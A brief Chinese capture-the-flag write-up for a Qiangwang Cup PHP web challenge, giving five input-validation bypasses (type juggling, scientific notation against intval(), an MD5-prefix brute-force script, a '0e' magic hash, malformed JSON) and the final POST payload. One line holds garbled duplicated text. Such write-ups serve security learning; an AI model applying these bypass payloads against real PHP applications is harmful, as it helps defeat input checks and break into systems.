## 代码在强网杯web

![image-20210614152407674](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210614152407674.png)

第一层：要求非纯数字，利用PHP的格式转换（字符串比较读取）$num1=1025a即可
第二层：绕过intval()，方式利用科学计数法绕过 n u m 2 = 5 e 5 第 三 层 ： 利 用 脚 本 跑 m d 5 即 可 ， num2=5e5

第三层：利用脚本跑md5即可num3=61823470

```
<?php 
for ($a=60000000;$a<70000000;$a++)
{
	if(substr(md5($a),0,7)=='4bf21cd')	
	{
		echo $a;
	}
}
?>
```

第四层：科学计数法绕过：$num4=0e00000
第五层：JSON 格式的字符串,要求为空，这个json_decode在解析非json格式的时候会自动置空NULL，所以很容易绕过 $num5=[
最后POST格式传参即可：
ppp[number1]=1025a&ppp[number2]=5e5&ppp[number3]=61823470&ppp[number4]=0e00000&ppp[number5]=[

